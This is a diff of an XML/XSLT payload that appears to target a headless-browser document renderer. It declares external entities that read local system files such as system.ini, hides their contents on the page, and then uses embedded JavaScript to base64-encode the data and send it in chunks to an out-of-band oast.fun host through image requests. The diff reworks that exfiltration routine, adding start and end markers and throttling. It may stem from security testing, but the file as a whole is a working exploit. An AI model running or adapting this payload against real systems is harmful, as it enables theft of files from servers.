@@ -1,3 +1,4 @@
+
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xsl" href="?#"?>
 <!DOCTYPE div [
@@ -6,22 +7,29 @@
   <!ENTITY sysini_p        "file:///c:/windows/system.ini">
   <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
 ]>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
   <xsl:template match="/">
+    <!-- include stylesheet so entities are available to the JS DOM -->
     <xsl:copy-of select="document('')"/>
+
     <body xmlns="http://www.w3.org/1999/xhtml">
+      <!-- hidden entity dump -->
       <div style="display:none">
         <p class="&passwd_p;">&passwd_c;</p>
         <p class="&sysini_p;">&sysini_c;</p>
       </div>
 
-      <div id="r" style="width:40rem"></div>
+      <!-- visible proof -->
+      <div style="width:40rem" id="r"></div>
 
-      <script>
-        function b64encode(str) {
+      <script><![CDATA[
+        // ---- Utilities ----
+        function b64encodeUtf8(str) {
+          // UTF-8 safe base64 (keep padding)
           return btoa(unescape(encodeURIComponent(str)));
         }
-
         function chunkString(str, size) {
           const out = [];
           for (let i = 0; i < str.length; i += size) {
@@ -29,36 +37,98 @@
           }
           return out;
         }
+        function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
 
-        let collected = '';
-        document.querySelectorAll('p').forEach(p => {
-          collected += 'PATH:' + p.className + '\n';
-          collected += 'CONTENT:\n' + p.innerHTML + '\n\n';
+        // ---- Render visible proof using textContent (not innerHTML) ----
+        const r = document.querySelector('#r');
 
-          document.querySelector('#r').innerHTML += `
-local file path:
-&lt;textarea style="width:100%;height:1.5rem">${p.className}&lt;/textarea>&lt;br/>
-local file content:
-&lt;textarea style="width:100%;height:60rem">${p.innerHTML}&lt;/textarea>&lt;br/>&lt;br/>`;
-        });
+        // remote URL
+        {
+          const label = document.createElement('div');
+          label.textContent = 'remote web url:';
+          r.appendChild(label);
 
-        const encoded = b64encode(collected);
-        const chunks = chunkString(encoded, 350);
+          const ta = document.createElement('textarea');
+          ta.style.width = '100%';
+          ta.style.height = '1.5rem';
+          ta.textContent = location.href;
+          r.appendChild(ta);
 
-        function sendChunk(i) {
-          if (i >= chunks.length) {
-            return;
-          }
-          const img = new Image();
-          img.src =
-            'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/' +
-            i + '/' + chunks[i] + '?t=' + Date.now();
-          document.body.appendChild(img);
-          setTimeout(() => sendChunk(i + 1), 400);
+          r.appendChild(document.createElement('br'));
+          r.appendChild(document.createElement('br'));
         }
 
-        sendChunk(0);
-      </script>
+        let raw = '';
+
+        // For each <p> in the hidden area, show path & content and append to raw
+        document.querySelectorAll('p').forEach(p => {
+          const path = p.className;
+          const data = p.textContent; // textContent preserves raw text
+
+          // visible path
+          {
+            const label = document.createElement('div');
+            label.textContent = 'local file path:';
+            r.appendChild(label);
+
+            const ta = document.createElement('textarea');
+            ta.style.width = '100%';
+            ta.style.height = '1.5rem';
+            ta.textContent = path;
+            r.appendChild(ta);
+          }
+
+          // visible content
+          {
+            const label = document.createElement('div');
+            label.textContent = 'local file content:';
+            r.appendChild(label);
+
+            const ta = document.createElement('textarea');
+            ta.style.width = '100%';
+            ta.style.height = '60rem';
+            ta.textContent = data;
+            r.appendChild(ta);
+
+            r.appendChild(document.createElement('br'));
+            r.appendChild(document.createElement('br'));
+          }
+
+          raw += 'PATH:' + path + '\n' + 'DATA:' + data + '\n\n';
+        });
+
+        // ---- Encode & chunk ----
+        const encoded = b64encodeUtf8(raw);
+        const CHUNK_SIZE = 350; // conservative to avoid URL truncation
+        const chunks = chunkString(encoded, CHUNK_SIZE);
+
+        const base = 'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/';
+
+        // ---- Send start marker ----
+        (function(){
+          const img = new Image();
+          img.src = base + '?start=1&n=' + chunks.length;
+          document.body.appendChild(img);
+        })();
+
+        // ---- Throttled chunk send (query params) ----
+        (async function(){
+          for (let i = 0; i < chunks.length; i++) {
+            const img = new Image();
+            // Use query string; URL-encode the chunk
+            img.src = base + '?i=' + i + '&n=' + chunks.length + '&d=' + encodeURIComponent(chunks[i]);
+            document.body.appendChild(img);
+            await sleep(80); // small delay to reduce drops in headless mode
+          }
+          // End marker
+          const end = new Image();
+          end.src = base + '?end=1&n=' + chunks.length;
+          document.body.appendChild(end);
+
+          // Give the headless browser time to flush all requests before print finalization
+          await sleep(1000);
+        })();
+      ]]></script>
     </body>
   </xsl:template>
 </xsl:stylesheet>
